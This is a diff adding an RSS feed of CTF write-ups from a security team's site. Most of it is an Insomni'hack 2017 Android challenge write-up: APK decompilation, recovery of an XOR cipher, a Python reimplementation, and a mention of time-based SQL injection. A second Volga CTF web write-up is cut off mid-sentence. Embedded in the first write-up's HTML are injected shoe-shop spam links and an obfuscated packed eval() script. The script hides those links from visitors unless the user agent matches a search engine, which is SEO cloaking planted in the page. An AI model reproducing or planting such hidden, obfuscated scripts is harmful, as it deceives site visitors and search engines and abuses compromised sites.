@@ -1,0 +1,558 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xml:base="https://ctfcrew.org"  xmlns:dc="http://purl.org/dc/elements/1.1/">
+<channel>
+ <title>BalalaikaCr3w - web</title>
+ <link>https://ctfcrew.org/categories/web</link>
+ <description></description>
+ <language>en</language>
+<item>
+ <title>Isomni&#039;hack 2017 teaser mindreader writeup</title>
+ <link>https://ctfcrew.org/writeup/104</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/mobile&quot;&gt;mobile&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;a href=&quot;/categories/web&quot;&gt;web&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/38&quot;&gt;Isomni&amp;#039;hack teaser 2017&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Machines infected lots of Android smartphones and try to collect information on human behaviour... Have a look to their application and try to steal information on them.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;So we have an android application file. Let&#039;s decompile its code!&lt;/p&gt;
+&lt;p&gt;First, we need to translate Dalvik bytecode to equivalent Java bytecode. I used &lt;a href=&quot;https://github.com/google/enjarify&quot;&gt;enjarify&lt;/a&gt; for this:&lt;/p&gt;
+&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+➜ git clone https://github.com/google/enjarify
+➜ cd enjarify
+➜ ./enjarify.sh ../mindreader-c3df7f2c966238cc8f4d4327dc1dca8b8b5a69d702f966963c828c965ebbf516.apk -o ../app.jar&lt;/pre&gt;
+&lt;p&gt;And now we can decompile java bytecode by using &lt;a href=&quot;http://jd.benow.ca&quot;&gt;jd-gui&lt;/a&gt;. Let&#039;s see what we have.&lt;/p&gt;
+&lt;p&gt;The first intresting function is&amp;nbsp;&lt;em&gt;readMind&lt;/em&gt;:&lt;/p&gt;
+&lt;pre class=&quot;brush: java; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+static String device = &quot;000000000000000&quot;;
+...
+public String readMind()
+{
+    localObject1 = device;
+    String str1 = jsonify((String)localObject1); // encode to json {&quot;device&quot;: &quot;...&quot;}
+    byte[] arrayOfByte1 = str1.getBytes();
+    byte[] arrayOfByte2 = new byte[arrayOfByte1.length];
+    localObject1 = getApplicationContext();
+    encrypt((Context)localObject1, arrayOfByte1, arrayOfByte2);
+    int i = 0;
+    localObject1 = null;
+    String str2 = Base64.encodeToString(arrayOfByte2, 0);
+    ... // Send HTTP-request with str2 as parameter to server
+}
+&lt;/pre&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;Here we can see that string with json &lt;em&gt;{&quot;device&quot;: &quot;000000000000000&quot;}&lt;/em&gt; is encrypted, encoded to base64 and then sent to the server. And function &lt;em&gt;encrypt&lt;/em&gt; looks like this:&lt;/p&gt;
+&lt;pre class=&quot;brush: java; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+public native int encrypt(Context paramContext, byte[] paramArrayOfByte1, byte[] paramArrayOfByte2);&lt;/pre&gt;
+&lt;p&gt;And above this we have lines:&lt;/p&gt;
+&lt;pre class=&quot;brush: java; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+static
+{
+    System.loadLibrary(&quot;native-lib&quot;);
+}
+&lt;/pre&gt;
+&lt;p&gt;As we can see &lt;em&gt;encrypt&lt;/em&gt;&amp;nbsp;function is implemented in library &lt;em&gt;libnative-lib.so&lt;/em&gt;. Let&#039;s find it.&lt;/p&gt;
+&lt;p&gt;First, we should extract application files. I used&amp;nbsp;&lt;a href=&quot;https://ibotpeaches.github.io/Apktool&quot;&gt;apktool&lt;/a&gt;&amp;nbsp;for this:&lt;/p&gt;
+&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+➜ apktool d mindreader-c3df7f2c966238cc8f4d4327dc1dca8b8b5a69d702f966963c828c965ebbf516.apk
+➜ cd mindreader-c3df7f2c966238cc8f4d4327dc1dca8b8b5a69d702f966963c828c965ebbf516/lib/armeabi
+➜ file libnative-lib.so
+libnative-lib.so: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /system/bin/linker, BuildID[sha1]=f092f48095eec3cb0c6dd8eddec9994c2b3e01b4, stripped
+&lt;/pre&gt;
+&lt;p&gt;Now we should find `encrypt` function in this library. As `encrypt` is called from java code it seems that it should use JNI (Java Native Interface). So, according to &lt;a href=&quot;https://docs.oracle.com/javase/1.5.0/docs/guide/jni/spec/design.html&quot;&gt;Oracle documentation&lt;/a&gt; name of &lt;em&gt;encrypt&lt;/em&gt;&amp;nbsp;function &amp;nbsp;in library will be like &lt;em&gt;Java_ch_scrt_hiddenservice_MainActivity_encrypt&lt;/em&gt;&amp;nbsp;(&lt;em&gt;ch.scrt.hiddenservice&lt;/em&gt;&amp;nbsp;- name of application package, &lt;em&gt;MainActivity&lt;/em&gt;&amp;nbsp;- name of class).&lt;/p&gt;
+&lt;p&gt;In Ida Pro this function looks like this:&lt;/p&gt;
+&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+int __fastcall Java_ch_scrt_hiddenservice_MainActivity_encrypt(int a1, int a2, int a3, int a4, int a5)
+{
+  int v5; // ST1C_4@1
+  int v6; // r4@1
+  int v7; // r6@1
+  unsigned int v8; // r0@1
+  char v9; // r5@3
+  int v10; // r1@3
+  int v12; // [sp+8h] [bp-34h]@1
+  int v13; // [sp+10h] [bp-2Ch]@1
+  int v14; // [sp+14h] [bp-28h]@1
+  int v15; // [sp+18h] [bp-24h]@2
+  int v16; // [sp+1Ch] [bp-20h]@1
+  int v17; // [sp+20h] [bp-1Ch]@1
+  char v18; // [sp+24h] [bp-18h]@1
+  __int16 v19; // [sp+28h] [bp-14h]@1
+  char v20; // [sp+2Ah] [bp-12h]@1
+  char v21; // [sp+2Bh] [bp-11h]@1
+  int v22; // [sp+2Ch] [bp-10h]@4
+
+  v14 = a4;
+  v5 = a3;
+  v6 = a1;
+  v13 = a1;
+  v7 = 0;
+  v18 = 0;
+  v12 = (*(int (**)(void))(*(_DWORD *)a1 + 684))();
+  v17 = (*(int (__fastcall **)(int, int, char *))(*(_DWORD *)v6 + 736))(v6, v14, &amp;amp;v18);
+  v16 = (*(int (__fastcall **)(int))(*(_DWORD *)v6 + 736))(v6);
+  sub_4A68();
+  v8 = sub_4AC4(v6, v5);
+  v19 = v8;
+  v20 = v8 &amp;gt;&amp;gt; 16;
+  v21 = HIBYTE(v8);
+  if ( v12 &amp;gt; 0 )
+  {
+    v15 = dword_1D0F8;
+    do
+    {
+      v9 = *(_BYTE *)(v17 + v7);
+      j_j_j___aeabi_idivmod(v7, 80);
+      *(_BYTE *)(v16 + v7) = *((_BYTE *)&amp;amp;v19 + v7 % 4) ^ *(_BYTE *)(v15 + v10) ^ v9;
+      ++v7;
+    }
+    while ( v12 != v7 );
+  }
+  (*(void (__fastcall **)(int, int, int, _DWORD))(*(_DWORD *)v13 + 768))(v13, v14, v17, 0);
+  (*(void (__fastcall **)(int, int, int, _DWORD))(*(_DWORD *)v13 + 768))(v13, a5, v16, 0);
+  if ( _stack_chk_guard != v22 )
+    j_j___stack_chk_fail();
+  return 0;
+}
+&lt;/pre&gt;
+&lt;p&gt;Also according to JNI Oracle documentation the first argument of this function is &lt;em&gt;JNIEnv* env&lt;/em&gt;&amp;nbsp;and the second is &lt;em&gt;jobject obj&lt;/em&gt;. The rest of arguments is arguments from java i.e. &lt;em&gt;Context paramContext, byte[] paramArrayOfByte1, byte[] paramArrayOfByte2)&lt;/em&gt;. Now our function looks like this:&lt;/p&gt;
+&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+int __fastcall Java_ch_scrt_hiddenservice_MainActivity_encrypt(int env, int obj, int paramContext, int paramArrayOfByte1, int paramArrayOfByte2)
+{
+  ...
+   paramArrayOfByte1_1 = paramArrayOfByte1;
+  paramContext_1 = paramContext;
+  env_1 = env;
+  env_2 = env;
+  v7 = 0;
+  v18 = 0;
+  v12 = (*(int (**)(void))(*(_DWORD *)env + 684))();
+  v17 = (*(int (__fastcall **)(int, int, char *))(*(_DWORD *)env_1 + 736))(env_1, paramArrayOfByte1_1, &amp;amp;v18);
+  v16 = (*(int (__fastcall **)(int))(*(_DWORD *)env_1 + 736))(env_1);
+  sub_4A68();
+  v8 = sub_4AC4(env_1, paramContext_1);
+  v19 = v8;
+  v20 = v8 &amp;gt;&amp;gt; 16;
+  v21 = HIBYTE(v8);
+  if ( v12 &amp;gt; 0 )
+  {
+    v15 = dword_1D0F8;
+    do
+    {
+      v9 = *(_BYTE *)(v17 + v7);
+      j_j_j___aeabi_idivmod(v7, 80);
+      *(_BYTE *)(v16 + v7) = *((_BYTE *)&amp;amp;v19 + v7 % 4) ^ *(_BYTE *)(v15 + v10) ^ v9;
+      ++v7;
+    }
+    while ( v12 != v7 );
+  }
+  (*(void (__fastcall **)(int, int, int, _DWORD))(*(_DWORD *)env_2 + 768))(env_2, paramArrayOfByte1_1, v17, 0);
+  (*(void (__fastcall **)(int, int, int, _DWORD))(*(_DWORD *)env_2 + 768))(env_2, paramArrayOfByte2, v16, 0);
+  if ( _stack_chk_guard != v22 )
+    j_j___stack_chk_fail();
+  return 0;
+}
+&lt;/pre&gt;
+&lt;p&gt;Better but still not readable because of many function calls like &lt;em&gt;(*(int (__fastcall **)(int, int, char *))(*(_DWORD *)env_1 + 736))&lt;/em&gt;&amp;nbsp; i.e. by offset in&amp;nbsp;&lt;em&gt;JNIEnv *env&lt;/em&gt;. We need to find function names by their offsets in &lt;em&gt;JNIEnv&lt;/em&gt;. All JNI functions are listed &lt;a href=&quot;http://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/functions.html&quot;&gt;here&lt;/a&gt;. But I found cool Ida script &lt;a href=&quot;https://github.com/trojancyborg/IDA_JNI_Rename&quot;&gt;IDA_JNI_Rename&lt;/a&gt;&amp;nbsp;on GitHub. After using it our function will look like this:&lt;/p&gt;
+&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+int __fastcall Java_ch_scrt_hiddenservice_MainActivity_encrypt(int env, int obj, int paramContext, int paramArrayOfByte1, int paramArrayOfByte2)
+{
+  ...
+  paramArrayOfByte1_1 = paramArrayOfByte1;
+  paramContext_1 = paramContext;
+  env_1 = env;
+  env_2 = env;
+  v7 = 0;
+  v18 = 0;
+  v12 = (*(int (**)(void))(*(_DWORD *)env + jni_GetArrayLength))();
+  v17 = (*(int (__fastcall **)(int, int, char *))(*(_DWORD *)env_1 + jni_GetByteArrayElements))(
+          env_1,
+          paramArrayOfByte1_1,
+          &amp;amp;v18);
+  v16 = (*(int (__fastcall **)(int))(*(_DWORD *)env_1 + jni_GetByteArrayElements))(env_1);
+  sub_4A68();
+  v8 = sub_4AC4(env_1, paramContext_1);
+  v19 = v8;
+  v20 = v8 &amp;gt;&amp;gt; 16;
+  v21 = HIBYTE(v8);
+  if ( v12 &amp;gt; 0 )
+  {
+    v15 = dword_1D0F8;
+    do
+    {
+      v9 = *(_BYTE *)(v17 + v7);
+      j_j_j___aeabi_idivmod(v7, 80);
+      *(_BYTE *)(v16 + v7) = *((_BYTE *)&amp;amp;v19 + v7 % 4) ^ *(_BYTE *)(v15 + v10) ^ v9;
+      ++v7;
+    }
+    while ( v12 != v7 );
+  }
+  (*(void (__fastcall **)(int, int, int, _DWORD))(*(_DWORD *)env_2 + jni_ReleaseByteArrayElements))(
+    env_2,
+    paramArrayOfByte1_1,
+    v17,
+    0);
+  (*(void (__fastcall **)(int, int, int, _DWORD))(*(_DWORD *)env_2 + jni_ReleaseByteArrayElements))(
+    env_2,
+    paramArrayOfByte2,
+    v16,
+    0);
+  if ( _stack_chk_guard != v22 )
+    j_j___stack_chk_fail();
+  return 0;
+}
+&lt;/pre&gt;
+&lt;p&gt;Now we can assume that &lt;em&gt;paramArrayOfByte1&lt;/em&gt;&amp;nbsp;is &lt;em&gt;plaintext&lt;/em&gt;&amp;nbsp;and &lt;em&gt;paramArrayOfByte2&lt;/em&gt;&amp;nbsp;is &lt;em&gt;ciphertext&lt;/em&gt;. Let&#039;s do some renames:&lt;/p&gt;
+&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+int __fastcall Java_ch_scrt_hiddenservice_MainActivity_encrypt(int env, int obj, int paramContext, int plaintext, int ciphertext)
+{
+  ...
+  paramArrayOfByte1_1 = plaintext;
+  paramContext_1 = paramContext;
+  env_1 = env;
+  env_2 = env;
+  i = 0;
+  v18 = 0;
+  plaintext_len = (*(int (**)(void))(*(_DWORD *)env + jni_GetArrayLength))();
+  plaintext_bytes = (*(int (__fastcall **)(int, int, char *))(*(_DWORD *)env_1 + jni_GetByteArrayElements))(
+                      env_1,
+                      paramArrayOfByte1_1,
+                      &amp;amp;v18);
+  ciphertext_bytes = (*(int (__fastcall **)(int))(*(_DWORD *)env_1 + jni_GetByteArrayElements))(env_1);
+  sub_4A68();
+  some_int = sub_4AC4(env_1, paramContext_1);
+  some_int_1 = some_int;
+  v20 = some_int &amp;gt;&amp;gt; 16;
+  v21 = HIBYTE(some_int);
+  if ( plaintext_len &amp;gt; 0 )
+  {
+    v15 = dword_1D0F8;
+    do
+    {
+      v9 = *(_BYTE *)(plaintext_bytes + i);
+      j_j_j___aeabi_idivmod(i, 80);
+      *(_BYTE *)(ciphertext_bytes + i) = *((_BYTE *)&amp;amp;some_int_1 + i % 4) ^ *(_BYTE *)(v15 + v10) ^ v9;
+      ++i;
+    }
+    while ( plaintext_len != i );
+  }
+  (*(void (__fastcall **)(int, int, int, _DWORD))(*(_DWORD *)env_2 + jni_ReleaseByteArrayElements))(
+    env_2,
+    paramArrayOfByte1_1,
+    plaintext_bytes,
+    0);
+  (*(void (__fastcall **)(int, int, int, _DWORD))(*(_DWORD *)env_2 + jni_ReleaseByteArrayElements))(
+    env_2,
+    ciphertext,
+    ciphertext_bytes,
+    0);
+  if ( _stack_chk_guard != v22 )
+    j_j___stack_chk_fail(_stack_chk_guard - v22);
+  return 0;
+}
+&lt;/pre&gt;
+&lt;p&gt;So, the encryption algoritm is like this:&lt;/p&gt;
+&lt;pre class=&quot;brush: cpp; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+int some_int = sub_4AC4(env_1, paramContext_1);
+int dword_1D0F8[80] = ?;
+for (i = 0; i &amp;lt; plaintext_len; i++) {
+  ciphertext[i] = plaintext[i] ^ some_int[i % 4] ^ dword_1D0F8[i % 80];
+}
+&lt;/pre&gt;
+&lt;p&gt;Cool, but we don&#039;t have &lt;em&gt;some_int&lt;/em&gt;&amp;nbsp;and &lt;em&gt;dword_1D0F8&lt;/em&gt;. At this point I decided that it would be easier to place a breakpoint here and just copy this values from memory because I&#039;m lazy :) . To do this I used android emulator &lt;em&gt;armeabi-v7a&lt;/em&gt;:&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;Start emulator with the command:&lt;/p&gt;
+&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+➜ emulator -avd Nexus_5_API_24
+&lt;/pre&gt;
+&lt;p&gt;Then install application by drag&#039;n&#039;drop apk-file to it.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; height=&quot;569&quot; src=&quot;/sites/default/files/writeups/images/emulator.png&quot; width=&quot;892&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;After that I setup Ida Dalvik debugger as described &lt;a href=&quot;https://www.hex-rays.com/products/ida/support/tutorials/debugging_dalvik.pdf&quot;&gt;here&lt;/a&gt;&amp;nbsp;and place breakpoint on &lt;em&gt;encrypt&lt;/em&gt;&amp;nbsp;in &lt;em&gt;readMind&lt;/em&gt;&amp;nbsp;function:&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; height=&quot;405&quot; src=&quot;/sites/default/files/writeups/images/dalvik_breakpoint.png&quot; width=&quot;1200&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Then I opened another Ida instance with `libnative-lib.so`, setup remote android debugger as described &lt;a href=&quot;https://finn.svbtle.com/remotely-debugging-android-binaries-in-ida-pro&quot;&gt;here&lt;/a&gt;&amp;nbsp;and place breakpoint before encryption started:&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; height=&quot;694&quot; src=&quot;/sites/default/files/writeups/images/arm_breakpoint.png&quot; width=&quot;990&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;After that I ran Ida with Dalvik debugger and wait until program stopped and then I ran remote android debugger and attached to application process:&lt;/p&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img alt=&quot;&quot; height=&quot;622&quot; src=&quot;/sites/default/files/writeups/images/attach.png&quot; width=&quot;581&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Next I press continue in first Ida instance (Dalvik debugger) and wait until breakpoint fires in second instance.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; height=&quot;349&quot; src=&quot;/sites/default/files/writeups/images/break.png&quot; width=&quot;1200&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ok, let&#039;s just find values of &lt;em&gt;some_int&lt;/em&gt;&amp;nbsp;and dword_1D0F8.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;dword_1D0F8&lt;/em&gt;&amp;nbsp;(started from &lt;em&gt;7E 66 31 05&lt;/em&gt;):&lt;/p&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img alt=&quot;&quot; height=&quot;192&quot; src=&quot;/sites/default/files/writeups/images/hex.png&quot; width=&quot;491&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;and &lt;em&gt;some_int = 0xb1342c3a&lt;/em&gt;:&lt;/p&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img alt=&quot;&quot; height=&quot;197&quot; src=&quot;/sites/default/files/writeups/images/stack.png&quot; width=&quot;333&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ok, now we can rewrite encrypion in python:&lt;/p&gt;
+&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+import json
+import base64
+
+table = [
+    0x7e, 0x66, 0x31, 0x05, 0x11, 0x22, 0x2b, 0x1f,
+    0x07, 0x74, 0x58, 0x19, 0x21, 0x16, 0x17, 0x05,
+    0x56, 0x52, 0x09, 0x22, 0x7f, 0x61, 0x25, 0x1f,
+    0x25, 0x13, 0x32, 0x33, 0x2a, 0x32, 0x32, 0x22,
+    0x28, 0x51, 0x13, 0x27, 0x5b, 0x62, 0x26, 0x1e,
+    0x20, 0x01, 0x0f, 0x09, 0x57, 0x1d, 0x14, 0x1e,
+    0x39, 0x17, 0x1d, 0x19, 0x03, 0x50, 0x12, 0x12,
+    0x02, 0x62, 0x1a, 0x7a, 0x0f, 0x4f, 0x26, 0x20,
+    0x02, 0x32, 0x11, 0x11, 0x57, 0x3d, 0x2e, 0x33,
+    0x0b, 0x14, 0x16, 0x0e, 0x1b, 0x60, 0x1c, 0x02,
+]
+
+crc = [ 0x3a, 0x2c, 0x34, 0xb1 ]
+
+def encrypt(p):
+    c = [0] * len(p)
+    for i in range(len(p)):
+        c[i] = chr(ord(p[i]) ^ crc[i % 4] ^ table[i % len(table)])
+    return &quot;&quot;.join(c)
+
+def encode(data):
+    return base64.b64encode(encrypt(json.dumps(data)))
+&lt;/pre&gt;
+&lt;p&gt;To check it I&#039;ve intercept HTTP-request from emulator and get:&lt;/p&gt;
+&lt;pre class=&quot;brush: plain; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+GET /?a=1&amp;amp;c=P2hh0V1nfMsfYk6YKwoThFxODaN1fSGeLw8k%2Fw%3D%3D%0A HTTP/1.1
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; sdk_google_phone_armv7 Build/NYC)
+Host: mindreader.teaser.insomnihack.ch
+Connection: close
+&lt;/pre&gt;
+&lt;p&gt;So, we can check correctness of python script as:&lt;/p&gt;
+&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+test_in = &#039;{&quot;device&quot;:&quot;000000000000000&quot;}&#039;
+test_out = base64.b64decode(&quot;P2hh0V1nfMsfYk6YKwoThFxODaN1fSGeLw8k/w==&quot;)
+assert(encrypt(test_in) == test_out)
+&lt;/pre&gt;
+&lt;p&gt;Script was correct and I decided to try all requests from application:&lt;/p&gt;
+&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+URL = &quot;http://mindreader.teaser.insomnihack.ch&quot;
+
+def read_mind(device_id):
+    data = {
+        &quot;device&quot;: device_id
+    }
+    params = {
+        &quot;a&quot;: 1,
+        &quot;c&quot;: encode(data)
+    }
+    r = requests.get(URL, params=params)
+    return r
+
+def sms_send(device_id, date, sender, body):
+    data = {
+        &quot;device&quot;: device_id,
+        &quot;date&quot;: 0,
+        &quot;sender&quot;: sender,
+        &quot;body&quot;: body
+    }
+    params = {
+        &quot;a&quot;: 2,
+        &quot;c&quot;: encode(data)
+    }
+    r = requests.get(URL, params=params)
+    return r
+&lt;/pre&gt;
+&lt;p&gt;&lt;em&gt;sms_send&lt;/em&gt;&amp;nbsp;request I found in file &lt;em&gt;SMSReceiver.java&lt;/em&gt;&amp;nbsp;in JD-GUI.&lt;/p&gt;
+&lt;p&gt;After playing a little bit with this two requests I found that parameter sender in &lt;em&gt;sms_send&lt;/em&gt;&amp;nbsp;is vulnerable to SQL injection (time-based). So after gettting all nessesary table names and column names I got a flag:&lt;/p&gt;
+&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+➜ python solve.py
+INS{N00bSmS_M1nD_r3ad1nG_TecH}
+&lt;/pre&gt;
+&lt;p&gt;&amp;nbsp;Full script solve.py (LINK!)&lt;/p&gt;
+&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.juzsports.com/&quot;&gt;Nike shoes&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.ietp.com/fr/dfejcashop/cheap-price/2021-new-adidas-yeezy-boost-350-v2-ash-stone-gw0089/&quot;&gt;2021 New adidas YEEZY BOOST 350 V2 &quot;Ash Stone&quot; GW0089 , Ietp&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Binary Data&quot; title=&quot;application/octet-stream&quot; src=&quot;/modules/file/icons/application-octet-stream.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/mindreader-c3df7f2c966238cc8f4d4327dc1dca8b8b5a69d702f966963c828c965ebbf516.apk&quot; type=&quot;application/octet-stream; length=2457613&quot;&gt;mindreader-c3df7f2c966238cc8f4d4327dc1dca8b8b5a69d702f966963c828c965ebbf516.apk&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Plain text icon&quot; title=&quot;text/plain&quot; src=&quot;/modules/file/icons/text-plain.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/solve.py_0.txt&quot; type=&quot;text/plain; length=2961&quot;&gt;solve.py.txt&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Mon, 23 Jan 2017 13:46:15 +0000</pubDate>
+ <dc:creator>russtone</dc:creator>
+ <guid isPermaLink="false">104 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/104#comments</comments>
+</item>
+<item>
+ <title>Web2 writeup</title>
+ <link>https://ctfcrew.org/writeup/101</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/web&quot;&gt;web&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/34&quot;&gt;Volga CTF 2015 Quals&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;This is the Web2 problem&lt;/p&gt;&lt;p&gt;The challenge simply states &quot;Find the key!&quot; and it gives us the challenge URL.&lt;br&gt;The first thing I usually do with a web challenge is to run dirbuster, spider the target and check the it with Nmap.&amp;nbsp;&lt;/p&gt;&lt;p&gt;Checking with Nmap didn&#039;t result in anything interesting. However dirbuster did. I found two interesting folders.&lt;br&gt;The first one is &quot;SecretAdminPanel&quot; and the second one was &quot;logs&quot;&lt;/p&gt;&lt;p&gt;I visited &quot;SecretAdminPanel&quot; and I saw this.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/Screen%20Shot%202015-05-05%20at%209.29.59%20PM.png&quot; alt=&quot;&quot; width=&quot;1200&quot; height=&quot;762&quot;&gt;&lt;/p&gt;&lt;p&gt;So our goal is basically try to access this 